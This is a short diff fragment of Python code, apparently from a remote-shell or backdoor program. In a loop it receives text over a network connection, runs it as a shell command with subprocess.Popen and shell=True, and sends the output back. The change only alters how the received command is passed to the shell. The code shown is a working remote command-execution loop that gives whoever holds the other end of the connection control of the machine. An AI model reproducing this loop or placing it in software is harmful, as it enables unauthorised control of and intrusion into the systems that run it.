@@ -16,9 +16,7 @@ while True:
 	try:
 		data = connection.recv(1024)
 		data = data.decode('utf-8')
-		data = data.split(" ")
-		data[-1] = data[-1].replace("\n", "")
-		command_response = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+		command_response = subprocess.Popen([data], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 		command_response = str(command_response.stdout.read()) + " " + str(command_response.stderr.read())
 		connection.send(command_response.encode())
 	except Exception:
